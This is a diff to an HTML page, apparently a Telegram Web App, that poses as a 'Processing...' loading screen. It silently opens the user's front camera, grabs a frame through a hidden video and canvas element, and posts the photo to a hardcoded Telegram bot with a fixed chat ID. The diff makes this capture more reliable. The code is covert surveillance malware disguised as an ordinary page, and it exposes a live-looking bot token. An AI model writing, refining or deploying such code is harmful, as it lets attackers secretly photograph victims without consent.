@@ -2,54 +2,103 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Processing...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif;">
-    <h1 id="status">Loading...</h1>
+<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
+    <h1 id="status">📸 Инициализация...</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                
-                imageCapture.takePhoto()
-                    .then(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', '7406666272');
-                        formData.append('photo', blob, 'photo.jpg');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const status = document.getElementById('status');
 
-                        fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.ok) {
-                                document.getElementById('status').innerText = '✅ Фото отправлено!';
-                                tg.close();
-                            } else {
-                                document.getElementById('status').innerText = '❌ Ошибка API';
-                            }
-                        })
-                        .catch(() => {
-                            document.getElementById('status').innerText = '❌ Ошибка отправки';
-                        });
+        // Функция отправки фото
+        function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', '7406666272');
+            formData.append('photo', blob, 'photo.jpg');
 
-                        stream.getTracks().forEach(t => t.stop());
-                    })
-                    .catch(err => {
-                        document.getElementById('status').innerText = '❌ Ошибка камеры: ' + err.message;
-                        console.error(err);
-                    });
+            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
+                method: 'POST',
+                body: formData
             })
-            .catch(err => {
-                document.getElementById('status').innerText = '❌ Нет доступа: ' + err.message;
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    status.innerText = '✅ Отправлено!';
+                    tg.close();
+                } else {
+                    status.innerText = '❌ Ошибка API';
+                    console.error(data);
+                }
+            })
+            .catch(() => {
+                status.innerText = '❌ Ошибка сети';
             });
+        }
+
+        // Запрос камеры
+        navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            } 
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.play();
+
+            // Ждём, когда появится первый кадр
+            video.addEventListener('timeupdate', function onTimeUpdate() {
+                video.removeEventListener('timeupdate', onTimeUpdate);
+
+                // Устанавливаем размер canvas
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+
+                // Рисуем кадр
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Конвертируем в Blob и отправляем
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        sendPhoto(blob);
+                    } else {
+                        status.innerText = '❌ Ошибка Blob';
+                    }
+                    // Останавливаем камеру
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.8);
+            });
+
+            // Если timeupdate не сработал — делаем принудительный захват через 500 мс
+            setTimeout(() => {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            sendPhoto(blob);
+                        }
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg', 0.8);
+                }
+            }, 1000);
+        })
+        .catch(err => {
+            status.innerText = '❌ Ошибка: ' + err.message;
+            console.error(err);
+        });
     </script>
 </body>
 </html>
